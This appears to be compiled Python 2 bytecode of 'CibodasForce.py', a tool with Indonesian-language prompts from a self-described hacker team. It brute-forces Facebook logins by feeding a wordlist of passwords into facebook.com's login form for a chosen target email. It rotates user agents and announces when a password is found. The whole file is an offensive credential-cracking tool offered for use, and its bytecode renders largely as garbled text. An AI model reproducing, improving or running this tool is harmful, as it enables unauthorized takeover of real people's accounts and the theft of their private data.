ó
]]c           @   s@  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d Z d Z d Z d Z	 d Z
 d Z d Z d	 Z d
 Z d Z d Z d Z d Z d	 Z d   Z d   Z e   e e e d   Z e e e
 d   a d Z d g Z d   Z d   Z d   Z d   Z d   Z  d   Z! e" d k r<e   n  d S(   iÿÿÿÿNs   [90;1ms   [96;1ms   [34;1ms   [33;1ms   [32;1ms   [0;1ms   [31;1ms   [36;1ms   [34ms   [32ms   [31mc         C   sG   x@ |  d D]4 } t  j j |  t  j j   t j d d  q Wd  S(   Ns   
g      $@i4  (   t   syst   stdoutt   writet   flusht   timet   sleep(   t   st   noobs(    (    s   CibodasForce.pyt   runntxt   s    c           C   s   t  j d  d GHt t d  t j d  t d GHt d GHt d GHt d GHt d GHt d	 GHt d
 GHt d GHt d GHd  S(   Nt   cleart    s                     â¥ WELCOME â¥g      ø?s)     =======================================sA     â¢â¢â¢â¢â¢â¢   BRUTE FORCE FACEBOOK.   â¢â¢â¢â¢â¢â¢s&                 Baca Bismillah Dulu yaaas   â¦ Created : Gamings   â¦ Team : Hacker cibodass&   â¦ Github : https://github.com/Gamings"   â¦ YouTube : FREE TUTORIAL PEMULA(   t   ost   systemR   t   GLR   R   t   GGt   Y(    (    (    s   CibodasForce.pyt   banner#   s    								s$   [92mMasukkan Email Target =>[93m  s   Masukkan pass.txt =>[93m s2   https://www.facebook.com/login.php?login_attempt=1sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0s8   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geckc          C   s   t  d GHt t d   }  |  d k s3 |  d k rC t j d  n> |  d k s[ |  d k rq t d GHt j   n t d	 GHt	   d  S(
   NR
   s   [?] Coba Lagi ?[93;1m[y/n]: t   yR   s   python2 force.pyt   nt   Ns   Keluar dari program...s   Pilih yang bener cuk...(
   R   t   strt	   raw_inputR   R   t   wdR    t   exitt   RRt   pil(   t   g(    (    s   CibodasForce.pyR   :   s    			c          C   s   t  d GHt t d   }  |  d k s3 |  d k rN t j d t  t   n> |  d k sf |  d k r| t d GHt j	   n t
 d	 GHt   d  S(
   NR
   s%   [?] Edit wordlist bos? [96;1m[y/n]: R   R   s   nano R   R   s   Keluar Dari Program...s   Pilih yg bener...(   R   R   R   R   R   t   password_listR   R   R    R   R   t   edit_wordlist(   t   ed(    (    s   CibodasForce.pyR   F   s    	
		c          C   s   t  j   a t j   }  t j t  t j t  t j	 |   t j
 t  t j t  t j t  j j   d d t   t   d GHt d GHd GHd  S(   Nt   max_timei   R
   s    wordlist tidak ada yg cocok...(   t	   mechanizet   BrowserR   t	   cookielibt   LWPCookieJart   set_handle_robotst   Falset   set_handle_redirectt   Truet   set_cookiejart   set_handle_equivt   set_handle_referert   set_handle_refresht   _httpt   HTTPRefreshProcessort
   runn_noobst   lifeR   (   t   cj(    (    s   CibodasForce.pyt   mainU   s    	c         C   sF  yt  j j t d t d |   t  j j   d t j t  f g t	 _
 t	 j t  } t	 j d d  t t	 j d <|  t	 j d <t	 j   } | j   } | t k rd | k rd	 GHd
 GHd GHt d GHt d j t  GHt d j |   GHd	 GHt t d  t  j d  n  Wn+ t k
 rAt d GHt   t  j   n Xd  S(   Ns   
[[91m+[92m][91;1m [[97ms%   [91m][90m Mencoba ==> [91m[[90;1ms
   User-agentt   nri    t   emailt   passt   login_attemptR
   s"   [96m                S U C C E S Ss#             P A S S W O R D  F I N D s-   +-------------------------------------------+s!   #[97m ID / Email Target:[92m {}s   #[97m Password Target:[92m {}s   TEKAN ENTER UNTUK KELUAR...i   s   Stop.......(   R    R   R   R   t   email_targetR   t   randomt   choicet
   useragentsR   t
   addheaderst   opent   logint   select_formt   formt   submitt   geturlR   t   formatR   t   WWR   t   KeyboardInterruptR   R   (   t   hack_passwordt   sitet   tomt   mask(    (    s   CibodasForce.pyt   BLANKd   s0     		c          C   s@   t  t d  }  x* |  D]" a t j d d  }  t t  q Wd  S(   Nt   rs   
t    (   R:   R   RC   t   replaceRG   (   t   password_nob(    (    s   CibodasForce.pyR.      s    c          C   se   t  d }  |  GHt t d  } | j   } t d j t  GHt d Gt |  Gd GHt d GHd GHd  S(   NsV   
             [90;1mHacker-Cibodas[91;1m
             Creator by:[97m Gaming
      RH   s$    [#] ID / Username Target[97;1m: {}s%    [#] JUmlah Password saat ini[97;1m:t   passwords,    [#] Tunggu Proses Cracking[97;1m..........R
   (   R   R:   R   t	   readlinesR   R@   R5   t   len(   t   lopt   nuub(    (    s   CibodasForce.pyR-      s    	t   __main__(   sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0s8   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck(#   R   R    R   R6   R!   R   R   R   t   BBt   YYR   RA   R   t   CCt   BR   t   Gt   Wt   Rt   CR   R   R   R   R5   R   R;   R8   R   R   R0   RG   R.   R-   t   __name__(    (    (    s   CibodasForce.pyt   <module>   sD   									